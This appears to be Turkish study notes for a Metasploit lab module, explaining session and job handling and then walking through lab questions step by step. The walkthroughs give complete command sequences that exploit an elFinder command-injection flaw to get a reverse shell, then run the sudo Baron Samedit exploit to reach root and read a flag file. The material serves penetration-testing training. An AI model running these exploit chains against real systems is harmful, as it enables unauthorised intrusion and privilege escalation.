---
glightbox: true
icon: material/help
---

# Sessions

## Using Sessions

Meterpreter içerisinde ++control+z++ tuş kombinasyonu ile veya `background` komutunu çalıştırarak mevcut oturumu arka plana taşıyabiliriz. Bu işlemin ardından dilersek farklı bir modül ile çalışabiliriz.

### Listing Active Sessions

```text
sessions
```

```text title="Output"
Active sessions
===============

  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -> 10.10.10.205:50501 (10.10.10.205)
```

### Interacting with a Session

```text
sessions -i 1
```

```text title="Output"
[*] Starting interaction with 1...

meterpreter >
```

## Jobs

Belirli bir port altında aktif olarak çalışan bir exploit varsa ve bu porta farklı bir modül için ihtiyaç duyuluyorsa ++control+c++ tuş kombinasyonu ile oturumu sonlandıramayız. Bunun yapılması portu kullanılabilir hale getirmez.

Bunun yerine, arka planda çalışan aktif görevlere bakmak için `jobs` komutunu kullanmak ve daha sonra ilgili portu boşa çıkarmak için eski görevleri sonlandırmak gerekir.

### Running an Exploit as a Background Job

```text
exploit -j
```

```text title="Output"
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.34:4444
```

### Listing Running Jobs

Çalışan tüm işleri listelemek için aşağıdaki komut kullanılabilir:

```text
jobs -l
```

```text title="Output"
Jobs
====

 Id  Name                    Payload                    Payload opts
 --  ----                    -------                    ------------
 0   Exploit: multi/handler  generic/shell_reverse_tcp  tcp://10.10.14.34:4444
```

Belirli bir işi sonlandırmak için ilgili işin index bilgisi kullanılabilir:

```text
kill 0
```

## Questions

```text
The target has a specific web application running that we can find by looking into the HTML source code. What is the name of that web application?
```

??? tip "Steps"

    Web tarayıcısında [http://10.129.203.52](http://10.129.203.52) adresine gittikten sonra sayfa kaynağını görüntüleyerek istenilen cevaba ulaşabilirsin.

```text
Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?
```

??? tip "Steps"

    Öncelikle Msfconsole aracını başlat:

    ```bash
    sudo msfconsole -q
    ```

    Aşağıdaki aramayı gerçekleştir:

    ```text
    search elfinder
    ```

    Çıkan sonuçlardan ilgili exploit modülünü kullan:

    ```text
    use exploit/linux/http/elfinder_archive_cmd_injection
    ```

    RHOSTS değerini ayarla:

    ```text
    set RHOSTS 10.129.203.52
    ```

    LHOST değerini ayarla:

    ```text
    set LHOST 10.10.14.87
    ```

    Exploit başlat:

    ```text
    exploit
    ```

    Sistem shell aktif et:

    ```text
    shell
    ```

    Aşağıdaki komutu çalıştır:

    ```bash
    whoami
    ```

    Cevabı edindikten sonra shell penceresini çıkış yap ve Meterpreter oturumunu arka plana taşımak için aşağıdaki komutu kullan (bir sonraki soruda bu oturumu kullanmamız gerekecek, o yüzden Msfconsole da açık kalmalı):

    ```text
    background
    ```

```text
The target system has an old version of Sudo running. Find the relevant exploit and get root access to the target system. Find the flag.txt file and submit the contents of it as the answer.
```

??? tip "Steps"

    Öncelikle aşağıdaki aramayı gerçekleştir:

    ```text
    search sudo
    ```

    Çıkan sonuçlardan ilgili exploit modülünü kullan. Bu modül ile `root` kullanıcısı olabileceğiz:

    ```text
    use exploit/linux/local/sudo_baron_samedit
    ```

    Bu soruyu çözebilmek için önceden edindiğimiz oturumu kullanacağız. Bu oturuma ait index bilgisini aşağıdaki komut ile öğren:

    ```text
    sessions
    ```

    ```text title="Output"
    Active sessions
    ===============

      Id  Name  Type                   Information               Connection
      --  ----  ----                   -----------               ----------
      1         meterpreter x86/linux  www-data @ 10.129.203.52  10.10.14.87:4444 -> 10.129.203.52:41988 (10.129.203.52)
    ```

    SESSION değerini ayarla:

    ```text
    set SESSION 1
    ```

    LHOST değerini ayarla:

    ```text
    set LHOST 10.10.14.87
    ```

    Exploit başlat:

    ```text
    run
    ```

    Sistem shell aktif et:

    ```text
    shell
    ```

    Flag dosyasının konumunu bulmak için aşağıdaki komutu çalıştır:

    ```bash
    sudo find / -name flag.txt -type f 2> /dev/null
    ```

    ```text title="Output"
    /root/flag.txt
    ```

    Bulunan dosyanın içeriğini görüntülemek için aşağıdaki komutu çalıştır:

    ```bash
    cat /root/flag.txt
    ```
